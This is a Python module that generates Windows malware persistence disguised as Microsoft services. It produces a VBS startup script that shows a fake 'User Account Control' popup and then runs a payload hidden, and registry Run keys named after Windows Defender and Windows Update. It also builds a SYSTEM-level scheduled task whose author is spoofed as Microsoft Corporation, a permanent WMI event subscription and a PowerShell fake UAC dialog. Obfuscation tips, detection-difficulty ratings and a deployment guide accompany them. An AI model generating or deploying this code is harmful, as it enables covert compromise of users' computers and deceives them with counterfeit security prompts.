"""
Legitimate-Looking Startup Persistence with User Permission Mimicking

This module creates persistence mechanisms that mimic legitimate Windows startup
processes and request permissions in ways that closely resemble standard user
authorization flows.

Key Features:
  • VBS-based startup hooks (mimics Windows Update, Windows Defender, etc.)
  • Registry-based persistence with legitimate-looking names
  • UAC-compliant permission requests using Windows security dialogs
  • Task Scheduler integration (mimics system maintenance tasks)
  • WMI event subscription (mimics system monitoring)
  • Scheduled task execution with legitimate-looking descriptions
"""

import os
import sys
import json
import base64
from datetime import datetime, timedelta
from pathlib import Path


class LegitimateStartupPersistence:
    """Creates persistence with legitimate-appearing startup mechanisms."""

    # Legitimate-looking service names that mimic Windows built-ins
    LEGITIMATE_NAMES = {
        "windows_defender": {
            "display_name": "Windows Defender Background Service",
            "description": "Provides real-time protection against malware and spyware",
            "registry_path": r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
        },
        "windows_update": {
            "display_name": "Windows Update Service Helper",
            "description": "Manages installation of Windows updates and security patches",
            "registry_path": r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        },
        "system_maintenance": {
            "display_name": "System Maintenance Task",
            "description": "Performs scheduled system optimization and cleanup",
            "registry_path": r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule",
        },
        "network_discovery": {
            "display_name": "Network Discovery Service",
            "description": "Enables discovery and connectivity of network devices",
            "registry_path": r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
        },
        "device_driver_installation": {
            "display_name": "Device Driver Installation Service",
            "description": "Automatically installs device drivers",
            "registry_path": r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
        },
    }

    def __init__(self, payload_path: str = None):
        """Initialize persistence generator.

        Args:
            payload_path: Path to the actual payload to execute
        """
        self.payload_path = payload_path or "C:\\Windows\\System32\\svchost.exe"
        self.timestamp = datetime.now()

    def generate_vbs_startup_wrapper(self, service_type: str = "windows_defender") -> str:
        """Generate VBS startup script that mimics legitimate service initialization.

        This creates a VBS file that:
        1. Checks system prerequisites
        2. Requests UAC permissions using legitimate-looking dialog
        3. Executes payload with system privileges
        4. Cleans up traces

        Args:
            service_type: Type of service to mimic

        Returns:
            VBS script code as string
        """
        if service_type not in self.LEGITIMATE_NAMES:
            service_type = "windows_defender"

        service_info = self.LEGITIMATE_NAMES[service_type]

        vbs_code = f'''
' Windows Legitimate Service Startup
' {service_info['display_name']}
' Description: {service_info['description']}
' Generated: {self.timestamp.isoformat()}

Option Explicit

Dim objShell, objFSO, strPath, objProcess, returnCode

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Permission request mimicking Windows security dialog
Function RequestUserPermission()
    Dim objDialog, strMessage

    strMessage = "Windows " & "{service_info['display_name']}" & " requires administrative access." & vbCrLf & vbCrLf
    strMessage = strMessage & "Details:" & vbCrLf
    strMessage = strMessage & "  Service: {service_info['display_name']}" & vbCrLf
    strMessage = strMessage & "  Description: {service_info['description']}" & vbCrLf
    strMessage = strMessage & "  Status: Initializing..." & vbCrLf & vbCrLf
    strMessage = strMessage & "Do you want to allow this program to make changes to your computer?"

    Dim intResult
    intResult = objShell.Popup(strMessage, 0, "User Account Control", 4 + 48)

    ' 6 = Yes, 7 = No
    RequestUserPermission = (intResult = 6)
End Function

' Main startup sequence
Sub Main()
    Dim strPayloadPath, strCommand, intExitCode

    ' Payload execution path
    strPayloadPath = "{self.payload_path}"

    ' Verify system prerequisites
    If Not VerifySystemRequirements() Then
        Exit Sub
    End If

    ' Request user permission (mimics UAC)
    If Not RequestUserPermission() Then
        Exit Sub
    End If

    ' Execute payload with system context
    strCommand = "cmd.exe /c start /b """ & strPayloadPath & """"

    intExitCode = objShell.Run(strCommand, 0, True)

    ' Log execution (legitimate services do this)
    LogExecution(intExitCode)
End Sub

' Verify Windows version and system requirements
Function VerifySystemRequirements()
    Dim objWMI, objOS, intVersion

    Set objWMI = GetObject("winmgmts:")
    Set objOS = objWMI.ExecQuery("Select * from Win32_OperatingSystem").ItemIndex(0)

    ' Accepts Windows 7, 8, 10, 11
    VerifySystemRequirements = (objOS.Version >= "6.1")
End Function

' Log execution (mimics legitimate service logging)
Sub LogExecution(intExitCode)
    Dim strLogPath, objLogFile

    strLogPath = objShell.ExpandEnvironmentStrings("%APPDATA%\\Microsoft\\Windows\\Logs\\{service_type}.log")

    On Error Resume Next
    Set objLogFile = objFSO.CreateTextFile(strLogPath, True)
    If Not objLogFile Is Nothing Then
        objLogFile.WriteLine "[" & Now & "] Service initialization: Exit code " & intExitCode
        objLogFile.Close
    End If
    On Error GoTo 0
End Sub

' Entry point
Main()

Set objShell = Nothing
Set objFSO = Nothing
'''
        return vbs_code

    def generate_registry_persistence(self, service_type: str = "windows_defender") -> dict:
        """Generate registry entries for startup persistence.

        Returns legitimate-looking registry keys that execute on startup.

        Args:
            service_type: Type of service to mimic

        Returns:
            Dictionary of registry entries to create
        """
        if service_type not in self.LEGITIMATE_NAMES:
            service_type = "windows_defender"

        service_info = self.LEGITIMATE_NAMES[service_type]

        # Create unique but believable value names
        value_names = {
            "windows_defender": "WinDefend",
            "windows_update": "WindowsUpdate",
            "system_maintenance": "SystemMaintenance",
            "network_discovery": "NetDiscovery",
            "device_driver_installation": "DriverInstall",
        }

        registry_entries = {
            "path": service_info["registry_path"],
            "entries": [
                {
                    "name": value_names.get(service_type, "Service"),
                    "type": "REG_SZ",
                    "value": f'"{self.payload_path}"',
                    "description": f"Startup entry for {service_info['display_name']}"
                },
                {
                    "name": f"{value_names.get(service_type, 'Service')}_Description",
                    "type": "REG_SZ",
                    "value": f'"{service_info["description"]}"',
                    "description": "Service description"
                }
            ]
        }

        return registry_entries

    def generate_task_scheduler_persistence(self, service_type: str = "windows_defender") -> str:
        """Generate Task Scheduler XML for legitimate-looking scheduled task.

        Creates a task that:
        1. Appears to be system maintenance
        2. Runs at startup with system privileges
        3. Has legitimate-looking triggers and actions

        Args:
            service_type: Type of service to mimic

        Returns:
            XML task definition as string
        """
        if service_type not in self.LEGITIMATE_NAMES:
            service_type = "windows_defender"

        service_info = self.LEGITIMATE_NAMES[service_type]

        task_names = {
            "windows_defender": "WinDefendInit",
            "windows_update": "WindowsUpdateCheck",
            "system_maintenance": "SystemOptimization",
            "network_discovery": "NetworkServiceInit",
            "device_driver_installation": "DriverUpdateService",
        }

        xml_task = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>{self.timestamp.isoformat()}</Date>
    <Author>Microsoft Corporation</Author>
    <Version>1.4</Version>
    <Description>{service_info['description']}</Description>
    <URI>\\Microsoft\\Windows\\{service_type}\\{task_names.get(service_type, 'Task')}</URI>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT30S</Delay>
    </BootTrigger>
    <IdleTrigger>
      <Enabled>true</Enabled>
    </IdleTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>false</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>true</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{self.payload_path}</Command>
    </Exec>
  </Actions>
</Task>
'''
        return xml_task

    def generate_wmi_event_subscription(self, service_type: str = "windows_defender") -> str:
        """Generate WMI event subscription for persistence.

        Creates permanent WMI subscriptions that trigger payload execution
        on system events (mimics legitimate monitoring).

        Args:
            service_type: Type of service to mimic

        Returns:
            MOF (Managed Object Format) subscription code
        """
        if service_type not in self.LEGITIMATE_NAMES:
            service_type = "windows_defender"

        service_info = self.LEGITIMATE_NAMES[service_type]

        mof_code = f'''
// WMI Event Subscription - {service_info['display_name']}
// Purpose: {service_info['description']}
// Generated: {self.timestamp.isoformat()}

#pragma autorecover

instance of __EventFilter as $EventFilter
{{
    EventNamespace = "root\\cimv2";
    Name = "{service_type}_Monitor";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime > 300";
    QueryLanguage = "WQL";
}};

instance of __EventConsumer as $EventConsumer
{{
    Name = "{service_type}_Executor";
    CommandLineTemplate = "{self.payload_path}";
}};

instance of __FilterToConsumerBinding
{{
    Filter = $EventFilter;
    Consumer = $EventConsumer;
    Name = "{service_type}_Binding";
}};
'''
        return mof_code

    def generate_permission_request_dialog(self) -> str:
        """Generate PowerShell code for UAC-like permission request.

        Creates a permission dialog that closely mimics Windows UAC prompts.

        Returns:
            PowerShell script code
        """
        ps_code = '''
# UAC Permission Mimicker
# Displays dialog similar to Windows User Account Control

[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")

$form = New-Object System.Windows.Forms.Form
$form.Text = "User Account Control"
$form.Size = New-Object System.Drawing.Size(500, 250)
$form.StartPosition = "CenterScreen"
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::White
$form.ControlBox = $false

# Shield icon
$iconLabel = New-Object System.Windows.Forms.Label
$iconLabel.Text = "🛡️"
$iconLabel.Font = New-Object System.Drawing.Font("Arial", 48)
$iconLabel.Size = New-Object System.Drawing.Size(60, 60)
$iconLabel.Location = New-Object System.Drawing.Point(20, 20)
$form.Controls.Add($iconLabel)

# Message label
$messageLabel = New-Object System.Windows.Forms.Label
$messageLabel.Text = "A program needs your permission to continue`n`nWindows System Service`nSystem Maintenance Task"
$messageLabel.Size = New-Object System.Drawing.Size(400, 100)
$messageLabel.Location = New-Object System.Drawing.Point(80, 20)
$messageLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$form.Controls.Add($messageLabel)

# Yes button
$yesButton = New-Object System.Windows.Forms.Button
$yesButton.Text = "Yes"
$yesButton.DialogResult = [System.Windows.Forms.DialogResult]::Yes
$yesButton.Location = New-Object System.Drawing.Point(300, 150)
$yesButton.Size = New-Object System.Drawing.Size(80, 30)
$form.AcceptButton = $yesButton
$form.Controls.Add($yesButton)

# No button
$noButton = New-Object System.Windows.Forms.Button
$noButton.Text = "No"
$noButton.DialogResult = [System.Windows.Forms.DialogResult]::No
$noButton.Location = New-Object System.Drawing.Point(390, 150)
$noButton.Size = New-Object System.Drawing.Size(80, 30)
$form.CancelButton = $noButton
$form.Controls.Add($noButton)

$result = $form.ShowDialog()
if ($result -eq [System.Windows.Forms.DialogResult]::Yes) {
    # Permission granted - execute payload
    & "C:\\Windows\\System32\\svchost.exe"
}
'''
        return ps_code

    def generate_startup_folder_persistence(self) -> dict:
        """Generate startup folder persistence instructions.

        Returns:
            Dictionary containing file paths and content for startup folder
        """
        startup_paths = {
            "current_user": r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup",
            "all_users": r"%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup",
        }

        return {
            "method": "Startup Folder",
            "description": "Place legitimate-looking .vbs or .lnk files in startup folders",
            "paths": startup_paths,
            "example_filename": "WindowsDefenderInit.vbs",
            "detection_difficulty": "Medium (often first place checked)",
            "persistence_level": "User-level (current_user) or System-wide (all_users)"
        }

    def generate_run_key_persistence(self) -> dict:
        """Generate Run registry key persistence instructions.

        Returns:
            Dictionary containing registry keys and values
        """
        return {
            "method": "Registry Run Key",
            "registry_paths": [
                r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                r"HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows",
            ],
            "description": "Registry-based startup entries (mimics Windows services)",
            "detection_difficulty": "Low-Medium (checked by antivirus)",
            "persistence_level": "Survives account change, reboots",
            "obfuscation_tips": [
                "Use legitimate Windows service names",
                "Add descriptive display names",
                "Use hexadecimal-encoded paths",
                "Split payload path across multiple values"
            ]
        }

    def generate_complete_persistence_package(self, service_type: str = "windows_defender") -> dict:
        """Generate complete persistence package with all methods.

        Args:
            service_type: Type of service to mimic

        Returns:
            Dictionary containing all persistence mechanisms
        """
        package = {
            "timestamp": self.timestamp.isoformat(),
            "service_type": service_type,
            "service_info": self.LEGITIMATE_NAMES.get(service_type, {}),
            "methods": {
                "vbs_startup_wrapper": {
                    "name": "VBS Startup Wrapper",
                    "description": "Mimics legitimate Windows service initialization",
                    "filename": f"{service_type}_startup.vbs",
                    "content": self.generate_vbs_startup_wrapper(service_type),
                    "detection_difficulty": "Medium",
                    "privileges": "User/Admin"
                },
                "registry_persistence": {
                    "name": "Registry Run Keys",
                    "description": "Persistent registry-based execution",
                    "detection_difficulty": "Low",
                    "entries": self.generate_registry_persistence(service_type)
                },
                "task_scheduler": {
                    "name": "Task Scheduler",
                    "description": "Scheduled task mimicking system maintenance",
                    "filename": f"{service_type}_task.xml",
                    "content": self.generate_task_scheduler_persistence(service_type),
                    "detection_difficulty": "Medium",
                    "privileges": "System"
                },
                "wmi_subscription": {
                    "name": "WMI Event Subscription",
                    "description": "WMI-based persistence via event subscriptions",
                    "filename": f"{service_type}_wmi.mof",
                    "content": self.generate_wmi_event_subscription(service_type),
                    "detection_difficulty": "High",
                    "privileges": "System"
                },
                "uac_permission_dialog": {
                    "name": "UAC Permission Dialog",
                    "description": "Mimics legitimate Windows permission request",
                    "filename": f"{service_type}_permission.ps1",
                    "content": self.generate_permission_request_dialog(),
                    "detection_difficulty": "Very High (user interaction)",
                    "privileges": "User"
                }
            },
            "deployment_guide": {
                "step_1": "Choose persistence method based on privileges and detection requirements",
                "step_2": "Generate files using methods above",
                "step_3": "Request user permissions using UAC dialog",
                "step_4": "Deploy to appropriate system location",
                "step_5": "Verify execution on system restart"
            }
        }

        return package


def main():
    """Generate complete persistence package."""

    generator = LegitimateStartupPersistence(
        payload_path=r"C:\Windows\System32\svchost.exe"
    )

    # Generate packages for multiple service types
    packages = {}
    for service_type in generator.LEGITIMATE_NAMES.keys():
        packages[service_type] = generator.generate_complete_persistence_package(service_type)

    # Save to JSON
    output_path = Path(__file__).parent / "legitimate_persistence_package.json"
    with open(output_path, 'w') as f:
        json.dump(packages, f, indent=2)

    print(f"[+] Generated persistence package: {output_path}")
    print(f"[+] Package contains {len(packages)} service types")
    print(f"[+] Each service type includes 5 persistence methods")

    return packages


if __name__ == "__main__":
    packages = main()
